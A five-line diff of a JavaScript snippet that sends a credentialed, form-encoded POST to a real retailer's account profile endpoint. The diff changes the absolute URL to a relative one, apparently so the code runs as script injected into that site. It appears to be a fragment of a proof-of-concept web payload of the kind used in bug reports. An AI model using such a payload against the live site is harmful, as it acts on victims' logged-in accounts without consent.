@@ -1,5 +1,5 @@
 var xhr=new XMLHttpRequest()
-xhr.open("POST","https://account.kaufland.com/pages-web/profile?_data=routes%2F%24pages%2Fprofile")
+xhr.open("POST","/pages-web/profile?_data=routes%2F%24pages%2Fprofile")
 xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
 xhr.withCredentials=true;
 xhr.onreadystatechange=()=>{if(xhr.readyState==4){
